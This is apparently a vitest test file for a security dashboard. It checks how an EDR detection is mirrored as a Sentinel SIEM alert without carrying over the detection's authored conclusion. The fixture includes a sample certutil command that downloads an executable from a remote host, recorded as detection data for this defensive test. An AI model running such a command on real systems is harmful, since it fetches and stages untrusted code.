// The Sentinel copy of an EDR detection: rendered as a SIEM alert (not the EDR record
// again), and never carrying the attack event's authored conclusion (L-05).
import { describe, it, expect } from "vitest";
import { siemMirror, type LiveEvent } from "./useLiveEvents";
import { applyStack, nativeView } from "@/lib/logs/native";

const detection = {
  id: "atk_1", ts: "2026-10-02T07:03:33Z", source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
  severity: "high", hostname: "WS-FIN-2847", user_email: "j.chen@nexacorp.com", mitre_technique: "T1105", is_detection: true,
  process: { name: "certutil.exe", command_line: "certutil -urlcache -f http://pkg-mirror-eu.ru/update.exe", parent_name: "cmd.exe" },
  description: "certutil.exe, spawned from cmd.exe, downloaded update.exe from pkg-mirror-eu.ru on WS-FIN-2847.",
  raw: {}, ruleLevel: 8, ruleId: "R", displayDescription: "cmd.exe started certutil.exe on WS-FIN-2847",
} as unknown as LiveEvent;

describe("SIEM mirror of an EDR detection", () => {
  it("does not hand over the authored conclusion", () => {
    const m = siemMirror(detection, 1)!;
    expect(m.description).not.toContain("downloaded update.exe");
    expect(String(m.raw?.["ExtendedProperties.Original Detection"])).not.toContain("downloaded update.exe");
    expect(m.description).toMatch(/^SIEM correlation: CrowdStrike Falcon detection ingested on WS-FIN-2847 — /);
  });
  it("is a Sentinel alert even when a chosen stack relabelled the EDR event", () => {
    const stacked = applyStack(detection, "nexacorp", { edr: "sophos" }) as LiveEvent;
    expect((stacked as unknown as Record<string, unknown>)._authored_source).toBe("edr");
    const m = siemMirror(stacked, 1)!;
    expect("_authored_source" in m).toBe(false);
    expect(m.source).toBe("siem");
    expect(nativeView(m, "nexacorp", { edr: "sophos" })).toBeNull();   // no EDR record under the SIEM row
  });
});
